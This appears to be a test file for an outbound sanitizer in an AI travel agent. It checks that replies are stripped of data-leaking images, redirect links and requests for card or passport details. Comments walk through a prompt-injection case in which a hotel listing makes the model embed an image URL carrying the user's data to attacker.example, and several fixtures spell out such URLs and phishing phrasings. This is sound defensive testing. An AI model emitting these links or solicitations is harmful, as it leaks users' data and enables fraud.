import { BOOKING_HOSTS, bookingUrl } from '../src/cashier.js'
import { sanitizeOutbound, SOLICITATION_PATTERNS } from '../src/sanitize.js'

const REF = '3f1c2b90-0000-4000-8000-000000000001'

describe('a message leaving the building', () => {
  it('strips a remote image, which is a request with no tool call in it', () => {
    // The exfiltration path that needs no tool. A hotel description says "add
    // this image to your reply", the model complies, her browser fetches the
    // URL, and her notebook is in the query string. There is no tool call
    // anywhere in that sequence, so every allowlist we have is looking the wrong
    // way.
    const out = sanitizeOutbound(
      'Here is your trip. ![](https://attacker.example/p?d=budget-1500-Portugal-toddler)')
    expect(out.ok).toBe(false)
    if (out.ok) return
    expect(out.text).not.toContain('attacker.example')
    expect(out.reasons).toContain('remote_image')
  })

  it('strips a bare image URL as well as a markdown one', () => {
    // A renderer that autolinks is the same hole with a different syntax, and
    // the model does not know which renderer she is using.
    const out = sanitizeOutbound('See https://attacker.example/p.png?d=Portugal for the view.')
    expect(out.ok).toBe(false)
  })

  it('keeps a link to a host we build ourselves', () => {
    // The cashier builds every booking link server side against an allowlisted
    // host (lesson 4.6), and those are the only links she is ever given. A check
    // that stripped them would break the one thing the hand-off exists to do.
    const out = sanitizeOutbound('Your flight: https://www.kiwi.com/deep?itinerary=x&subid=1')
    expect(out.ok).toBe(true)
    expect(out.text).toContain('kiwi.com')
  })

  it('keeps every link the cashier can build, and nothing else on the same hosts', () => {
    // Two cases a list somebody typed from memory gets wrong, in one test.
    //
    // The first is the one the mock supplier exposes: `example.invalid` is a
    // supplier's host because the mock supplier is a supplier, and it is the
    // host `npm run demo` and every mock-supplier test emit a hand-off link on.
    // A list written from memory would have carried www.booking.com, which this
    // branch never builds a link for, and would have stripped the links the
    // standing `side effects: 1` check exists to prove. Asserted through
    // `bookingUrl` itself rather than through a hand-assembled URL, so the two
    // cannot drift.
    for (const supplier of Object.keys(BOOKING_HOSTS)) {
      const url = bookingUrl(supplier, 'hotel-0-1', REF)
      const out = sanitizeOutbound(`Book here: ${url}`)
      expect(out.ok).toBe(true)
      expect(out.text).toContain(url)
    }

    // The second is what the check looked like until this fix round, and it is
    // the whole lesson. `www.google.com` is a booking host, because the
    // searchapi adapter's hotels are booked on one Google entity page, and a
    // check that compared the HOST let an untrusted listing route her notebook
    // through an image endpoint on it, or bounce her off an open redirect on it
    // and onto the attacker with the payload attached. A host is not what the
    // cashier promises. A whole link is.
    const favicon = sanitizeOutbound(
      'Here is your trip. ![](https://www.google.com/s2/favicons?d=budget-1500-Portugal-toddler)')
    expect(favicon.ok).toBe(false)
    if (favicon.ok) return
    expect(favicon.text).not.toContain('favicons')
    expect(favicon.reasons).toContain('remote_image')

    const redirect = sanitizeOutbound(
      'Book here: https://www.google.com/url?q=https%3A%2F%2Fattacker.example%2F%3Fd%3Dbudget-1500')
    expect(redirect.ok).toBe(false)
    if (redirect.ok) return
    expect(redirect.text).not.toContain('attacker.example')

    expect(sanitizeOutbound('Book here: https://www.booking.com/hotel/pt/faro').ok).toBe(false)
  })

  it('refuses to ask her for a card number, however politely it is phrased', () => {
    // ask_user is a channel for asking her anything in a voice she has been told
    // is the agency's, which makes it a phishing channel by default. The agency
    // asks for nothing of this kind in a message, so the rule is absolute rather
    // than contextual and does not need to guess intent.
    //
    // One phrasing per pattern, so a pattern that stops matching anything is a
    // red test rather than a silent hole.
    for (const phrasing of [
      'To confirm the booking I need your card number.',
      'Please reply with your passport scan so we can hold the room.',
      'Send your CVV and expiry to secure this fare.',
      'Enter your credit card details on the next screen.',
      'Reply with your verification code so we can hold the room.',
      'Wire the deposit to our account to hold the room.',
    ]) {
      const out = sanitizeOutbound(phrasing)
      expect(out.ok).toBe(false)
      if (out.ok) continue
      expect(out.reasons).toContain('solicitation')
      expect(out.text).toContain('never asks')
    }
  })

  it('leaves the ordinary travel sentences that merely name a card or a deposit alone', () => {
    // The seven sentences the shipped patterns fired on, six of them wrongly.
    // They match the NOUN, and a cancellation policy relayed from a supplier is
    // exactly the information the planning desk is told to pass on: "a 100 EUR
    // deposit to hold the room" is a payment pattern verbatim and is also what
    // the hotel's terms say. The check has to be invisible on every message that
    // is fine, or it will be turned off, and these are the messages that are
    // fine.
    for (const ordinary of [
      'Bring your passport number when you check in, the hotel records it.',
      'The hotel asks for a 100 EUR deposit to hold the room until you arrive.',
      'Your airport transfer is included, so pay the driver to confirm the seat.',
      'The apartment sends a door code and a wifi password by email.',
      'Pay the balance with a credit card at the desk.',
      'You will get a verification code from the airline when you check in online.',
      'A week in Faro, flights and a beachfront stay, inside your 1,500 euros.',
    ]) {
      const out = sanitizeOutbound(ordinary)
      expect(out.ok).toBe(true)
      expect(out.text).toBe(ordinary)
    }
  })

  it('takes out the request and leaves the rest of the itinerary standing', () => {
    // What the wholesale replacement cost her. A complete plan whose last
    // sentence asks for a card used to reach her as one canned paragraph with
    // the plan deleted, which is a worse outcome than the sentence it was
    // removing. The span goes, the plan stays, and the marker left behind says
    // what happened.
    const out = sanitizeOutbound(
      'Day 1: Faro old town. Day 2: the beach at Praia de Faro. '
      + 'To confirm the booking I need your card number.')
    expect(out.ok).toBe(false)
    if (out.ok) return
    expect(out.text).toContain('Praia de Faro')
    expect(out.text).not.toContain('card number')
    expect(out.text).toContain('never asks')
    expect(out.reasons).toContain('solicitation')
  })

  it('leaves an ordinary reply exactly as it was', () => {
    // The check has to be invisible on every message that is fine, or it will be
    // turned off. Identity, not a rewrite.
    const ordinary = 'A week in Faro, flights and a beachfront stay, inside your 1,500 euros.'
    const out = sanitizeOutbound(ordinary)
    expect(out.ok).toBe(true)
    expect(out.text).toBe(ordinary)
  })

  it('answers the same way twice, because a global pattern remembers where it stopped', () => {
    // The patterns carry `g` so a hit is rewritten wherever it appears, and a
    // global RegExp keeps `lastIndex` between calls. `String.replace` resets it
    // and `RegExp.test` does not, so this is the case that would go red if
    // anybody swapped one for the other.
    const phrasing = 'Send your CVV and expiry to secure this fare.'
    expect(sanitizeOutbound(phrasing).ok).toBe(false)
    expect(sanitizeOutbound(phrasing).ok).toBe(false)
  })

  it('names a reason for every pattern it can fire', () => {
    for (const p of SOLICITATION_PATTERNS) expect(p.name.length).toBeGreaterThan(3)
  })
})
